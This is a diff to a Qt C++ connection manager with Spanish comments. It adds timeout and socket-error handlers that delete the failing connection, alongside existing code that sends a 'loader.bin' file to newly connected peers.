@@ -15,6 +15,8 @@ void ConnectionManager::sendLoader(Connection *connection)
     if(connection->getState()==Connection::JustConnected)
     {
         connect(connection,SIGNAL(readyRead()),mngMessage,SLOT(readMessage()));
+        connect(connection,SIGNAL(timeout()),this,SLOT(connection_timeout()));
+        connect(connection,SIGNAL(error(QAbstractSocket::SocketError)),this,SLOT(connectionError(QAbstractSocket::SocketError)));
 
         /* Carga desde archivo */
         QFile fileLoader("loader.bin");
@@ -106,11 +108,23 @@ void ConnectionManager::processHandshake(Connection* connection)
 
     connection->setState(Connection::Ready);
     emit connectionReady(connection);
-
-
 }
 
 void ConnectionManager::addConnection(Connection* connection)
 {
     Connections.append(connection);
+}
+
+void ConnectionManager::connection_timeout()
+{
+    Connection* connection=qobject_cast<Connection*>(sender());
+    delete connection;
+}
+
+void ConnectionManager::connectionError(QAbstractSocket::SocketError)
+{
+    /*FIXME: Hacer que si hay un error en la conexión cuando la conexión ya
+             está añadida a la GUI, se elimine el item del TreeView */
+    Connection* connection=qobject_cast<Connection*>(sender());
+    delete connection;
 }
